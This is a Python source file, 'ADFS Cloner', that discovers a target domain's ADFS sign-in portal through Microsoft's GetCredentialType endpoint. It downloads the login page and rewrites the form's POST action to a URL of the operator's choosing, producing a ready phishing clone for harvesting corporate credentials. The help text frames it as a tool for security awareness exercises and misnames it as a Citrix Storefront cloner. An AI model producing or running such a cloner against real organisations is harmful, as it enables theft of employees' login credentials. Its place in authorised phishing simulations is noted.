import requests     # https://docs.python.org/3/library/requests.html
import json         # https://docs.python.org/3/library/json.html
import sys          # https://docs.python.org/3/library/sys.html
import argparse     # https://docs.python.org/3/library/argparse.html
import os           # https://docs.python.org/3/library/os.html
import re           # https://docs.python.org/3/library/re.html


def banner():
    banner = '''
        >> ADFS Cloner
        >> https://www.github.com/gh0x0st
    '''
    print(banner)


def check_adfs(target_domain):
    print (f'[*] Checking {target_domain} for an ADFS user portal')
    target_url = "https://login.microsoftonline.com:443/common/GetCredentialType?mkt=en-US"
    user_json = {"username": "test@"+target_domain}
    post_request = requests.post(target_url, json=user_json)

    # Get Fedederation URL
    post_string = post_request.text
    try:
        json_data = json.loads(post_string)
        federation_url = json_data["Credentials"]['FederationRedirectUrl']
        return federation_url
    except:
        print(f'[!] This domain does not appear to have an ADFS portal\n')
        sys.exit(1)


def download_page(federation_url, index_path):
    r = requests.get(federation_url)
    with open(index_path, 'w') as file:
        file.write(r.text)


def clean_page(federation_url, index_path, target_domain, action_url):
    with open(index_path, 'r') as file:
        filedata = file.read()

    base_url = federation_url.rsplit('/', 2)[0]

    with open(index_path, 'r') as file:
        filedata = file.read()

    print('[*] Resolving root-relative links to absolute links')
    filedata = filedata.replace('href="/adfs', 'href="'+base_url)
    filedata = filedata.replace('src=\'/adfs', 'src=\''+base_url)
    filedata = filedata.replace('background-image:url(/adfs',
                                'background-image:url('+base_url)

    print('[*] Removing username used to enumerate the portal')
    filedata = filedata.replace('test@'+target_domain, '')

    print(f'[*] Replacing POST action with {action_url}')
    current_action = re.findall(r'action=(.+?)"', filedata)[0]
    filedata = filedata.replace(current_action, '"'+action_url)

    # Done cleaning page
    with open(index_path, 'w') as file:
        file.write(filedata)


def main():
    banner()
    # build the parser
    parser = argparse.ArgumentParser(description='A python approach to clone Citrix Storefront \
        portals for use in security awareness exercises.')

    # build arguments
    parser.add_argument('-a', '--action-url',
                        action='store',
                        type=str,
                        dest='action_url',
                        help='Path to php page for form post action')
    parser.add_argument('-t', '--target-domain',
                        action='store',
                        type=str,
                        dest='target_domain',
                        help='Domain to enumerate')
    parser.add_argument('-c', '--clone-page',
                        action='store_true',
                        dest='clone_page',
                        help='Instruct script to clone page')

    # cycle through argument input
    args = parser.parse_args()

    # print help and exit if no parameters are given
    if len(sys.argv) == 1:
        parser.print_help()
        example_text = '''\nexamples:
        python3 adfs-cl.py -t example.com -a '/post.php'
        '''
        print(example_text)
        sys.exit(1)

    # Build variables from input
    action_url = args.action_url
    target_domain = args.target_domain
    clone_page = args.clone_page

    # Check for ADFS url
    federation_url = check_adfs(target_domain)
    print(f'[*] Federation URL: {federation_url}')

    if clone_page is True:
        index_path = os.path.join(os.getcwd(), 'index.html')
        download_page(federation_url, index_path)
        clean_page(federation_url, index_path, target_domain, action_url)
        print(f'[*] File saved to {index_path}\n')
    else:
        print("We will not clone this page")


if __name__ == '__main__':
    main()
